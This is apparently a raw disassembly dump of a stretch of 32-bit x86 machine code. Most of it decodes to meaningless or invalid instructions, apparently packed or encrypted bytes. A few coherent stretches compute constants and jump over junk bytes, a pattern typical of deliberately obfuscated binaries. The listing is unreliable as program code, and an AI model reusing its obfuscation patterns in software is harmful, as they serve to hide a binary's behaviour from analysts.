  4196a3:	and    BYTE PTR [edx+0x3c0dd5bb],dl
  4196a9:	mov    bl,cl
  4196ab:	sbb    al,0x3d
  4196ad:	and    esi,DWORD PTR [esi]
  4196af:	push   cs
  4196b0:	(bad)  
  4196b1:	push   0xffffffc1
  4196b3:	mov    eax,0xa17b0679
  4196b8:	loopne 0x419717
  4196ba:	sub    al,0x5d
  4196bc:	xor    ebx,esp
  4196be:	stos   BYTE PTR es:[edi],al
  4196bf:	repnz xchg ebx,eax
  4196c1:	jmp    0xc6c3efa6
  4196c6:	pop    fs
  4196c8:	test   BYTE PTR [edi-0x9],ch
  4196cb:	push   edi
  4196cc:	(bad)  [edi+0x50e1a6f3]
  4196d2:	or     dl,BYTE PTR [esi]
  4196d4:	mov    ch,0xf1
  4196d6:	mov    al,ds:0xdeb13079
  4196db:	shl    dh,cl
  4196dd:	fidiv  DWORD PTR [edx-0x7a1e4af3]
  4196e3:	add    al,0x1
  4196e5:	jb     0x419682
  4196e7:	sub    DWORD PTR [edi+0x2fe5bc93],esp
  4196ed:	push   ds
  4196ee:	xor    dl,0xc6
  4196f1:	mov    ds,WORD PTR [esi+0x4a]
  4196f4:	loop   0x4196c2
  4196f6:	add    bl,BYTE PTR [edx-0x1e31104f]
  4196fc:	push   ebp
  4196fd:	out    0x75,al
  4196ff:	or     esi,edx
  419701:	inc    ebp
  419702:	sbb    al,0xb6
  419704:	nop
  419705:	mov    ch,0xf6
  419707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419708:	inc    edi
  419709:	mov    al,0xf5
  41970b:	cmp    ah,BYTE PTR [ecx-0x67dbadd3]
  419711:	(bad)  
  419712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419714:	xchg   edx,eax
  419715:	mov    eax,0xbc3e8191
  41971a:	jmp    0x8fe0f844
  41971f:	sbb    edi,ebp
  419721:	loope  0x419774
  419723:	test   BYTE PTR [edx+0x67bc4165],ch
  419729:	jmp    0xc4fa:0xe1dd735f
  419730:	mov    WORD PTR [edx-0x79ede202],?
  419736:	mov    esp,0xbc099ec5
  41973b:	and    dl,BYTE PTR [ebx]
  41973d:	adc    DWORD PTR [ecx],0x2b1fa027
  419743:	sbb    BYTE PTR [eax-0x18e2977f],dh
  419749:	shr    DWORD PTR [edx-0x55],1
  41974c:	stc    
  41974d:	dec    esi
  41974e:	mov    edi,0x40171d08
  419753:	rcl    edx,0xff
  419756:	jl     0x4196f0
  419758:	xor    al,bh
  41975a:	imul   edi,edi,0xffffff99
  41975d:	shr    BYTE PTR [ecx-0x4f60f15b],1
  419763:	jmp    0xe77d:0xba4c
  419769:	pop    ss
  41976a:	add    esp,DWORD PTR [ebx+ebp*2]
  41976d:	ins    DWORD PTR es:[edi],dx
  41976e:	xchg   edi,eax
  41976f:	sbb    ch,BYTE PTR [ebx-0x18b6d21c]
  419775:	stos   BYTE PTR es:[edi],al
  419776:	or     dh,BYTE PTR [esi]
  419778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419779:	rcl    DWORD PTR [edi],0x2d
  41977c:	xor    al,0x86
  41977e:	(bad)  
  41977f:	shr    BYTE PTR ds:0x7e286f92,cl
  419785:	call   0xab0c6c2
  41978a:	out    0x7e,eax
  41978c:	leave  
  41978d:	(bad)  
  41978e:	sbb    eax,0xfb225b0c
  419793:	jmp    0xc745:0x26df1d59
  41979a:	jecxz  0x419810
  41979c:	cmp    al,0xfc
  41979e:	jg     0x419780
  4197a0:	leave  
  4197a1:	add    ch,dh
  4197a3:	xor    DWORD PTR [ecx*2-0x5661f2e2],esp
  4197aa:	or     BYTE PTR [ebx+0x16],cl
  4197ad:	add    BYTE PTR [ebx+0x2c],dl
  4197b0:	mov    bh,BYTE PTR [ebx-0x3a]
  4197b3:	inc    ecx
  4197b4:	pusha  
  4197b5:	xor    BYTE PTR [edi-0x15],0x75
  4197b9:	aam    0x60
  4197bb:	enter  0x6ac3,0xcf
  4197bf:	aad    0xdf
  4197c1:	or     DWORD PTR [ecx+0x3a],edi
  4197c4:	cmp    al,0x5d
  4197c6:	shl    ah,cl
  4197c8:	aaa    
  4197c9:	push   ebx
  4197ca:	inc    edx
  4197cb:	sbb    edi,0xffffffbf
  4197ce:	pop    esi
  4197cf:	ret    
  4197d0:	inc    edi
  4197d1:	sub    BYTE PTR [eax-0x297df5b0],0x1d
  4197d8:	sbb    esp,DWORD PTR [edx-0x36]
  4197db:	cmp    dl,al
  4197dd:	cmp    BYTE PTR [edi+0x4f5d3b8d],dh
  4197e3:	xor    eax,0x57ef87f6
  4197e8:	popf   
  4197e9:	mov    ds:0xfabbf12e,eax
  4197ee:	mov    bh,0xba
  4197f0:	mov    esi,0x8435454
  4197f5:	repz sbb edi,0xffffffb7
  4197f9:	pop    ebx
  4197fa:	sti    
  4197fb:	pop    edx
  4197fc:	in     eax,dx
  4197fd:	ret    0xcea8
  419800:	push   es
  419801:	mov    WORD PTR [ebp+0x24],?
  419804:	xor    eax,0x71a8792e
  419809:	lods   al,BYTE PTR ds:[esi]
  41980a:	jge    0x41980f
  41980c:	jle    0x4197bc
  41980e:	in     eax,0x82
  419810:	xor    bl,BYTE PTR [ecx]
  419812:	ja     0x4197de
  419814:	mov    ecx,ecx
  419816:	and    dl,BYTE PTR [ecx]
  419818:	adc    eax,0x4f681d41
  41981d:	and    edi,DWORD PTR [edx-0x57]
  419820:	sahf   
  419821:	jge    0x41982e
  419823:	cwde   
  419824:	outs   dx,DWORD PTR ds:[esi]
  419825:	pop    edi
  419826:	fwait
  419827:	sub    ch,BYTE PTR [ecx+edx*8-0x5f7acf50]
  41982e:	sub    DWORD PTR [ebp+eax*8-0x7f],0x6093c3f5
  419836:	mov    cs,WORD PTR [eax-0x34b446fe]
  41983c:	fcmovb st,st(3)
  41983e:	sbb    BYTE PTR [edi+0x59],dl
  419841:	xor    edx,DWORD PTR [ecx+0xa5282e5]
  419847:	std    
  419848:	not    BYTE PTR [ecx+0xd8d066a]
  41984e:	stos   BYTE PTR es:[edi],al
  41984f:	jmp    0xc264c3d
  419854:	pushf  
  419855:	or     bl,BYTE PTR [edi-0x7869681b]
  41985b:	call   0xaf87:0x1b862713
  419862:	retf   0x42a0
  419865:	or     ebp,esp
  419867:	popa   
  419868:	retf   0x45f3
  41986b:	fidiv  DWORD PTR [ebp+0xda0b4c1]
  419871:	mov    ds:0x69a1d199,al
  419876:	inc    edi
  419877:	in     eax,0xbe
  419879:	stos   BYTE PTR es:[edi],al
  41987a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41987b:	pop    ebx
  41987c:	xchg   ebp,eax
  41987d:	adc    BYTE PTR [edi],0x3a
  419880:	fwait
  419881:	call   0xa656efa1
  419886:	or     eax,0xe465a431
  41988b:	and    dl,al
  41988d:	sub    ch,BYTE PTR [ecx+0x52d0e255]
  419893:	xor    al,0xb6
  419895:	aas    
  419896:	lods   al,BYTE PTR ds:[esi]
  419897:	pop    esi
  419898:	test   BYTE PTR [ebp-0x15095e50],0x95
  41989f:	xchg   ebx,eax
  4198a0:	sbb    edi,ebp
  4198a2:	cmc    
  4198a3:	loopne 0x41982b
  4198a5:	in     al,0xe2
  4198a7:	mov    ecx,0xf034d7c8
  4198ac:	fs stos BYTE PTR es:[edi],al
  4198ae:	mov    eax,0xcb586eb
  4198b3:	shr    BYTE PTR [ebx],0x94
  4198b6:	lea    ebp,[esi]
  4198b8:	imul   esp,DWORD PTR [ebp+ebx*2+0x19],0x8b18f4ec
  4198c0:	jo     0x419872
  4198c2:	mov    edx,0xba371148
  4198c7:	xor    al,0xbf
  4198c9:	and    BYTE PTR [edx-0x4cb0b390],ah
  4198cf:	fld    DWORD PTR [ebx+0x5e174512]
  4198d5:	cmc    
  4198d6:	fidiv  DWORD PTR [eax]
  4198d8:	fidiv  DWORD PTR [ebx+ecx*8+0x1]
  4198dc:	cmp    eax,0xc5fb099
  4198e1:	mov    WORD PTR [esp+0x24],cx
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	inc    eax
  419917:	cmp    BYTE PTR [eax],dh
  419919:	frstor [ecx*1-0x3dca4140]
  419920:	mov    esi,0x7e8d0ebe
  419925:	mov    esi,?
  419927:	push   es
  419928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419929:	xor    DWORD PTR [esi],edx
  41992b:	dec    ecx
  41992c:	adc    eax,0x40badd5b
  419931:	dec    esp
  419932:	in     al,dx
  419933:	ret    
  419934:	fsubr  st,st(4)
  419936:	mov    al,ds:0xce725513
  41993b:	xor    esi,DWORD PTR [ebp-0x23]
  41993e:	push   edx
  41993f:	sti    
  419940:	mov    eax,ds:0x827087a8
  419945:	xor    DWORD PTR [ecx+0x3780a639],0xdf983b20
  41994f:	lock cmp al,0xaa
  419952:	mov    ch,0xee
  419954:	loopne 0x41990d
  419956:	ja     0x4198f5
  419958:	cli    
  419959:	test   BYTE PTR [ebx+0x73],cl
  41995c:	pushf  
  41995d:	call   0x72e4:0x599b90d0
  419964:	xor    DWORD PTR [ecx],esp
  419966:	or     cl,BYTE PTR [eax]
  419968:	lahf   
  419969:	mov    bh,0xbd
  41996b:	jb     0x4199ea
  41996d:	pop    edi
  41996e:	jl     0x419993
  419970:	cmc    
  419971:	pop    eax
  419972:	bound  ebp,QWORD PTR [ecx*4-0x2498b9c4]
  419979:	mov    ah,0xf0
  41997b:	and    al,bl
  41997d:	add    DWORD PTR [ebx-0x3b328aa9],esp
  419983:	push   es
  419984:	sbb    BYTE PTR [edx-0x76],ch
  419987:	lahf   
  419988:	pusha  
  419989:	imul   ebx,DWORD PTR [ecx+0x384fdfb6],0x230bcb2f
  419993:	and    esi,DWORD PTR [edx+0x1d]
  419996:	dec    esi
  419997:	and    eax,0x47843a57
  41999c:	into   
  41999d:	push   0xa328d151
  4199a2:	xor    DWORD PTR [ecx+0x5857ec98],0xffffffd9
  4199a9:	sbb    BYTE PTR [ebx+0x32],ah
  4199ac:	into   
  4199ad:	(bad)  
  4199ae:	or     eax,0x5b822b30
  4199b3:	jnp    0x419a2b
  4199b5:	sub    al,0xd
  4199b7:	(bad)  
  4199b9:	aam    0xd2
  4199bb:	adc    ch,BYTE PTR [edx-0x7da8de0d]
  4199c1:	inc    edx
  4199c2:	add    dh,BYTE PTR [ecx-0x22]
  4199c5:	jae    0x4199c6
  4199c7:	mov    dh,0xcd
  4199c9:	jge    0x41997a
  4199cb:	ja     0x419a0c
  4199cd:	mov    ebp,0xa7be9950
  4199d2:	enter  0xcabc,0xb1
  4199d6:	mov    BYTE PTR [ebx-0x21],ch
  4199d9:	mov    ebx,0x48c22561
  4199de:	ja     0x4199ff
  4199e0:	cld    
  4199e1:	jge    0x4199fc
  4199e3:	push   0x89dd99a0
  4199e8:	cdq    
  4199e9:	mov    eax,0x76a8524d
  4199ee:	fsubr  QWORD PTR [edi]
  4199f0:	xlat   BYTE PTR ds:[ebx]
  4199f1:	outs   dx,DWORD PTR ds:[esi]
  4199f2:	ds mov bh,0xbc
  4199f5:	cmp    al,0x55
  4199f7:	jecxz  0x419a30
  4199f9:	dec    ecx
  4199fa:	xchg   BYTE PTR [ebx+0x4d186592],ch
  419a00:	jle    0x419a7b
  419a02:	das    
  419a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a04:	sub    al,0xae
  419a06:	mov    ebx,0x516fa82f
  419a0b:	push   ebp
  419a0c:	jae    0x419a1e
  419a0e:	es sub esi,ebp
  419a11:	dec    esi
  419a12:	into   
  419a13:	mov    esp,0x8e7f74f8
  419a18:	jge    0x4199d8
  419a1a:	repz dec ebx
  419a1c:	scas   eax,DWORD PTR es:[edi]
  419a1d:	jmp    0x4199ea
  419a1f:	or     al,0xcf
  419a21:	jo     0x419a05
  419a23:	fstp   DWORD PTR [edx+0x77]
  419a26:	mov    dh,0xad
  419a28:	add    BYTE PTR [esi-0x65],bh
  419a2b:	cmp    edx,DWORD PTR [edx+0xf59eda9]
  419a31:	cs das 
  419a33:	push   di
  419a35:	sbb    bh,bh
  419a37:	jbe    0x4199e8
  419a39:	jo     0x4199cc
  419a3b:	(bad)  
  419a3d:	pusha  
  419a3e:	ret    0x60e6
  419a41:	into   
  419a42:	int3   
  419a43:	sbb    BYTE PTR [ecx+0x68],ch
  419a46:	mov    bh,0xf3
  419a48:	xchg   ecx,eax
  419a49:	cmp    ebx,esp
  419a4b:	dec    eax
  419a4c:	xchg   ebp,eax
  419a4d:	test   BYTE PTR [eax],0x90
  419a50:	mov    bh,BYTE PTR [eax]
  419a52:	lea    eax,[esi+eiz*4-0x3c]
  419a56:	jmp    0xf0fdfbeb
  419a5b:	jae    0x419a82
  419a5d:	pop    ds
  419a5e:	dec    esp
  419a5f:	cld    
  419a60:	mov    WORD PTR [edx],?
  419a62:	jmp    0x419ad8
  419a64:	mov    esi,0xbb0bd2a6
  419a69:	pslld  mm3,QWORD PTR [edi+0x1592c971]
  419a70:	scas   eax,DWORD PTR es:[edi]
  419a71:	shl    DWORD PTR [esi],1
  419a73:	xor    ah,BYTE PTR [ecx-0x24]
  419a76:	inc    ebx
  419a77:	push   ds
  419a78:	test   al,0xba
  419a7a:	aam    0x63
  419a7c:	sbb    DWORD PTR [eax-0x66],ebp
  419a7f:	ins    DWORD PTR es:[edi],dx
  419a80:	daa    
  419a81:	fs add eax,0xae1a7cc1
  419a87:	push   es
  419a88:	scas   eax,DWORD PTR es:[edi]
  419a89:	push   esi
  419a8a:	adc    eax,0x8783abf5
  419a8f:	scas   eax,DWORD PTR es:[edi]
  419a90:	jno    0x419a72
  419a92:	or     edi,esp
  419a94:	dec    edx
  419a95:	div    DWORD PTR [edi+0x5cfca117]
  419a9b:	mov    ah,0x11
  419a9e:	jbe    0x419acb
  419aa0:	outs   dx,BYTE PTR ds:[esi]
  419aa1:	push   ecx
  419aa2:	bound  eax,QWORD PTR [edx-0x6bb7a41d]
  419aa8:	xchg   ah,dl
  419aaa:	inc    edi
  419aab:	or     al,0x73
  419aad:	pop    esp
  419aae:	test   eax,0x18bacf72
  419ab3:	fs dec esi
  419ab5:	mov    ch,0x69
  419ab7:	and    bl,BYTE PTR [eax-0x2d1f11be]
  419abd:	mov    es,WORD PTR [ebp-0x5d]
  419ac0:	stos   BYTE PTR es:[edi],al
  419ac1:	mov    ah,0x41
  419ac3:	jo     0x419b3e
  419ac5:	adc    eax,0x9564952e
  419aca:	cmp    ch,BYTE PTR [ecx]
  419acc:	xor    ebp,DWORD PTR es:[ebx+0x5]
  419ad0:	out    dx,eax
  419ad1:	jb     0x419a9c
  419ad3:	pop    esp
  419ad4:	aad    0x6c
  419ad6:	mov    esi,0x6bff9f30
  419adb:	mov    esp,DWORD PTR [ecx+0xe863902]
  419ae1:	ds sub al,0x47
  419ae4:	dec    ebp
  419ae5:	imul   edx,DWORD PTR [ebx],0xcd08d3a6
  419aeb:	lods   al,BYTE PTR ds:[esi]
  419aec:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  419aee:	sub    eax,0xa56e402b
  419af3:	jl     0x419acc
  419af5:	mov    WORD PTR [esp+edx*1-0x33],gs
  419af9:	dec    esp
  419afa:	popa   
  419afb:	in     al,dx
  419afc:	pop    ecx
  419afd:	out    0x66,eax
  419aff:	ja     0x419a92
  419b01:	sub    ebx,DWORD PTR [esi]
  419b03:	pop    es
  419b04:	std    
  419b05:	aam    0xd8
  419b07:	pop    ds
  419b08:	inc    ecx
  419b09:	repnz int3 
  419b0b:	and    BYTE PTR [edx+edi*8],bh
  419b0e:	sub    DWORD PTR [edi+0xe],edi
  419b11:	push   es
  419b12:	jne    0x419b70
  419b14:	xchg   edi,eax
  419b15:	sbb    DWORD PTR [edi+0x5f],ebp
  419b18:	outs   dx,DWORD PTR ds:[esi]
  419b19:	loop   0x419b22
  419b1b:	stc    
  419b1c:	fcomp  DWORD PTR [ebp-0x57]
  419b1f:	jbe    0x419b07
  419b21:	jecxz  0x419afb
  419b23:	int3   
  419b24:	push   edx
  419b25:	fwait
  419b26:	and    BYTE PTR [edx+0x27],dh
  419b29:	or     eax,DWORD PTR [edx]
  419b2b:	enter  0xb2a9,0x3d
  419b2f:	xor    DWORD PTR [eax+0x7ed5ef4b],0xffffffed
  419b36:	or     bh,BYTE PTR [esi-0x79635066]
  419b3c:	inc    ecx
  419b3d:	(bad)  
  419b3e:	ror    BYTE PTR [edi+0x23],0xfc
  419b42:	arpl   si,ax
  419b44:	xchg   edx,eax
  419b45:	mov    bh,0xa2
  419b47:	inc    esi
  419b48:	or     al,0xad
  419b4a:	ltr    WORD PTR [ebp+0x4343531b]
  419b51:	hlt    
  419b52:	les    edi,FWORD PTR [ecx-0x5c]
  419b55:	aas    
  419b56:	fdivr  DWORD PTR [edi+eiz*8]
  419b59:	push   ebp
  419b5a:	mov    ebx,0x9f43d6ad
  419b5f:	lahf   
  419b60:	mov    ch,ch
  419b62:	mov    edx,0x10de
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	inc    edx
  419bba:	jecxz  0x419bb6
  419bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bbd:	pushf  
  419bbe:	adc    eax,eax
  419bc0:	mov    esi,0xbebec235
  419bc5:	or     BYTE PTR [esi-0x4b],bl
  419bc8:	xchg   ebx,eax
  419bc9:	or     al,0xd5
  419bcb:	aas    
  419bcc:	in     eax,0x2e
  419bce:	xchg   esi,eax
  419bcf:	ret    
  419bd0:	dec    esp
  419bd1:	out    0xbe,eax
  419bd3:	retf   
  419bd4:	call   0x29c0:0x4cdc1627
  419bdb:	ror    edx,1
  419bdd:	call   0xec88:0xfeea1586
  419be4:	shl    BYTE PTR [eax-0x75],0xe9
  419be8:	sub    cl,BYTE PTR [esi-0x2f]
  419beb:	mov    ah,0xa0
  419bed:	jmp    0x3ac9:0xde38802f
  419bf4:	or     BYTE PTR ds:0x5d8a2a72,dh
  419bfa:	(bad)  
  419bfb:	fnstenv [ecx-0x45]
  419bfe:	retf   
  419bff:	sub    BYTE PTR [eax-0x3d],ch
  419c02:	jns    0x419bb9
  419c04:	ficomp DWORD PTR [ebx]
  419c06:	sub    ebx,edx
  419c08:	mov    ah,0x56
  419c0a:	dec    esp
  419c0b:	das    
  419c0c:	or     dl,BYTE PTR [eax]
  419c0e:	adc    ecx,DWORD PTR [edi+edi*2-0x7eeec279]
  419c15:	pop    ebx
  419c16:	ins    DWORD PTR es:[edi],dx
  419c17:	cmp    BYTE PTR [ebx-0x45],ch
  419c1a:	mov    cl,0x8f
  419c1c:	add    eax,0x2848ca94
  419c21:	loop   0x419bab
  419c23:	sub    al,0x87
  419c25:	add    al,0xc9
  419c27:	mov    ebp,0x8bbebf3b
  419c2c:	cmc    
  419c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c2e:	pop    ecx
  419c2f:	pop    ds
  419c30:	rcr    al,1
  419c32:	cwde   
  419c33:	shr    DWORD PTR [edx+0x7e],1
  419c36:	push   ecx
  419c37:	or     ah,BYTE PTR [eax]
  419c39:	xchg   edx,eax
  419c3a:	and    al,0x2b
  419c3c:	aam    0xc2
  419c3e:	mov    DWORD PTR [ecx+eax*1+0x7f14a389],esi
  419c45:	fsubp  st(5),st
  419c47:	xor    eax,0x8bfb5442
  419c4c:	mov    eax,ds:0xadddef52
  419c51:	mov    bl,0xcd
  419c53:	retf   0x386e
  419c56:	(bad)  
  419c57:	adc    DWORD PTR ds:0xc50dcdf7,esi
  419c5d:	xor    BYTE PTR [ebx+0x4b],dh
  419c60:	and    DWORD PTR [eax],edx
  419c62:	popa   
  419c63:	cmc    
  419c64:	and    BYTE PTR [edi],0x85
  419c67:	add    edx,edx
  419c69:	imul   DWORD PTR [ebp-0x6a]
  419c6c:	aad    0xf5
  419c6e:	or     al,0x2d
  419c70:	xchg   edi,eax
  419c71:	mov    dl,al
  419c73:	ret    
  419c74:	mov    ah,dl
  419c76:	ins    DWORD PTR es:[edi],dx
  419c77:	push   ebp
  419c78:	adc    esp,esi
  419c7a:	aas    
  419c7b:	mov    ecx,0xb33ae475
  419c80:	es sti 
  419c82:	fneni(8087 only) 
  419c84:	mov    dh,0x94
  419c86:	mov    BYTE PTR [ecx+0x5e3ff5f],ch
  419c8c:	leave  
  419c8d:	adc    cl,ch
  419c8f:	pop    edx
  419c90:	sbb    ebp,edx
  419c92:	push   eax
  419c93:	fdivrp st(2),st
  419c95:	and    al,0xe5
  419c97:	loope  0x419c19
  419c99:	aas    
  419c9a:	retf   0xbae1
  419c9d:	imul   ebp,DWORD PTR [edx+0x4ff48ca1],0x78
  419ca4:	dec    esp
  419ca5:	mov    edi,0x37aa0157
  419caa:	mov    gs,ebx
  419cac:	jge    0x419cad
  419cae:	inc    esi
  419caf:	test   ecx,ebx
  419cb1:	cmp    DWORD PTR [edx],edi
  419cb3:	pop    edx
  419cb4:	sub    dh,BYTE PTR [ebp+0x3e0e7422]
  419cba:	popf   
  419cbb:	stos   BYTE PTR es:[edi],al
  419cbc:	fldenv [edx+0x66]
  419cbf:	test   BYTE PTR [esi],ah
  419cc1:	mov    ah,0x9
  419cc3:	sub    ch,bh
  419cc5:	je     0x419cf0
  419cc7:	pop    eax
  419cc8:	sbb    esi,DWORD PTR [edx]
  419cca:	(bad)  [ebx+eax*1-0x6f21940f]
  419cd1:	adc    eax,0xae9cba5e
  419cd6:	mov    ss,ebx
  419cd8:	inc    eax
  419cd9:	adc    eax,0xfce5527f
  419cde:	pop    ss
  419cdf:	jmp    0x71bc:0x58b088d9
  419ce6:	lock ror DWORD PTR [ebx+0x675eaf33],1
  419ced:	pop    ecx
  419cee:	dec    eax
  419cef:	ins    BYTE PTR es:[edi],dx
  419cf0:	loope  0x419d41
  419cf2:	(bad)  
  419cf4:	sub    ebx,DWORD PTR [ebx+0x51]
  419cf7:	ror    BYTE PTR [ebx-0x35a3673c],0xc7
  419cfe:	test   dl,0x8f
  419d01:	fwait
  419d02:	sbb    DWORD PTR [eax],0x21
  419d05:	fidiv  DWORD PTR [eax-0x37]
  419d08:	sar    BYTE PTR [edi-0x3d697f5a],1
  419d0e:	lods   eax,DWORD PTR ds:[esi]
  419d0f:	jmp    0x40a7:0x1ea9d869
  419d16:	and    DWORD PTR [ebx+0x48e9cbb3],0xef5acd0c
  419d20:	int3   
  419d21:	jl     0x419d04
  419d23:	push   es
  419d24:	test   DWORD PTR [esi-0x6a8d292b],edi
  419d2a:	xchg   edx,eax
  419d2b:	jo     0x419dab
  419d2d:	and    ch,BYTE PTR [ebx]
  419d2f:	cdq    
  419d30:	loop   0x419d1c
  419d32:	mov    esp,DWORD PTR [edi]
  419d34:	mov    esp,0xa171c4a2
  419d39:	jnp    0x419cfa
  419d3b:	dec    edi
  419d3c:	inc    esi
  419d3d:	inc    eax
  419d3e:	and    DWORD PTR [esi],ebx
  419d40:	push   ds
  419d41:	(bad)  
  419d42:	stc    
  419d43:	hlt    
  419d44:	push   ebp
  419d45:	ss (bad) 
  419d47:	retf   
  419d48:	and    al,0xcc
  419d4a:	xor    BYTE PTR [ebp+ebp*8-0x6f],dl
  419d4e:	lods   eax,DWORD PTR ds:[esi]
  419d4f:	add    dl,BYTE PTR [ecx-0x74]
  419d52:	jle    0x419d42
  419d54:	jge    0x419d34
  419d56:	pop    eax
  419d57:	mov    eax,0x861c1b1f
  419d5c:	mov    ebp,0xcf969d71
  419d61:	call   0x221f:0x851a88c7
  419d68:	xchg   ebx,eax
  419d69:	mov    esp,0x6e4e7244
  419d6e:	inc    edx
  419d6f:	jb     0x419d39
  419d71:	(bad)  
  419d72:	pop    eax
  419d73:	mov    dl,0xe0
  419d75:	add    DWORD PTR ds:[esi-0x4a81cce4],edx
  419d7c:	jge    0x419d65
  419d7e:	into   
  419d7f:	mov    WORD PTR [edx-0x10],gs
  419d82:	add    DWORD PTR [esi+0x2e38981f],ebx
  419d88:	std    
  419d89:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d8b:	loop   0x419db8
  419d8d:	push   esi
  419d8e:	xor    al,0x30
  419d90:	sbb    eax,0x1b5bc7c3
  419d95:	pusha  
  419d96:	stos   DWORD PTR es:[edi],eax
  419d97:	mov    ch,0x32
  419d99:	push   ebp
  419d9a:	ror    DWORD PTR [eax+0x5d],0x9a
  419d9e:	xchg   esi,eax
  419d9f:	xor    esi,0x2864dd1a
  419da5:	pop    ss
  419da6:	bound  esi,QWORD PTR [edi+0x5a]
  419da9:	into   
  419daa:	addr16 or eax,0xf5486100
  419db0:	mov    ch,dl
  419db2:	xor    edi,DWORD PTR [ebp+0x4141f5b8]
  419db8:	dec    ebp
  419db9:	mov    bh,0xce
  419dbb:	inc    edi
  419dbc:	adc    BYTE PTR [ebx],bl
  419dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dbf:	neg    DWORD PTR [esp+ebp*1+0x4]
  419dc3:	in     eax,0xe5
  419dc5:	jecxz  0x419d67
  419dc7:	and    BYTE PTR [esi-0x6f0b1bb8],dl
  419dcd:	aaa    
  419dce:	xchg   esp,eax
  419dcf:	add    ebx,edi
  419dd1:	jmp    0x419d84
  419dd3:	push   ds
  419dd4:	in     al,dx
  419dd5:	push   ecx
  419dd6:	jmp    0x419e08
  419dd8:	ins    DWORD PTR es:[edi],dx
  419dd9:	adc    DWORD PTR [ebx+ebp*1+0x8],ebx
  419ddd:	push   esp
  419dde:	aad    0x3d
  419de0:	aad    0xeb
  419de2:	cli    
  419de3:	aam    0x80
  419de5:	in     al,dx
  419de6:	outs   dx,DWORD PTR ds:[esi]
  419de7:	pop    esi
  419de8:	popa   
  419de9:	xchg   edx,eax
  419dea:	fst    DWORD PTR ds:0x69922345
  419df0:	mov    ecx,0x67b1bfa2
  419df5:	nop
  419df6:	inc    edx
  419df7:	test   BYTE PTR [edx+0x48],bl
  419dfa:	outs   dx,BYTE PTR ds:[esi]
  419dfb:	je     0x419e4f
  419dfd:	jmp    0x419e5e
  419dff:	loop   0x419e59
  419e01:	jno    0x419e34
  419e03:	(bad)  
  419e04:	cli    
  419e05:	mov    dx,WORD PTR [esp+0x24]
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	fnsave [edi]
  419e4e:	push   0x5e
  419e50:	sahf   
  419e51:	adc    edx,DWORD PTR [edi]
  419e53:	sar    BYTE PTR [esi-0x41413dcb],0x6f
  419e5a:	dec    esp
  419e5b:	inc    edi
  419e5c:	mov    ecx,ecx
  419e5e:	out    0x31,al
  419e60:	(bad)  
  419e61:	push   edx
  419e62:	stos   DWORD PTR es:[edi],eax
  419e63:	test   eax,0x851b77e8
  419e68:	or     bh,BYTE PTR [eax+0x14617fc0]
  419e6e:	stos   DWORD PTR es:[edi],eax
  419e6f:	and    esp,DWORD PTR ds:[edi+0x2]
  419e73:	ja     0x419ec4
  419e75:	push   cs
  419e76:	xchg   edi,eax
  419e77:	pop    esp
  419e78:	inc    ecx
  419e79:	lds    edi,FWORD PTR [eax]
  419e7b:	fsubr  QWORD PTR [edx+edx*8-0x3bdf162e]
  419e82:	jecxz  0x419e13
  419e84:	push   ebx
  419e85:	ror    BYTE PTR [ebp+0x7ccc5a0f],1
  419e8b:	cmp    eax,0x55be3f7b
  419e90:	and    ah,ch
  419e92:	add    al,0x71
  419e94:	mov    ah,0x27
  419e96:	jmp    0x1e54:0x76e1de83
  419e9d:	jns    0x419eeb
  419e9f:	fs dec edx
  419ea1:	push   cs
  419ea2:	or     BYTE PTR [esi+0x66],0xdd
  419ea6:	popf   
  419ea7:	in     eax,0x97
  419ea9:	xor    esp,DWORD PTR [ecx]
  419eab:	mov    edi,0xc2df5514
  419eb0:	xor    al,0x7d
  419eb2:	mov    ecx,0xeaf44617
  419eb7:	ja     0x419ef5
  419eb9:	int3   
  419eba:	or     eax,0xce909556
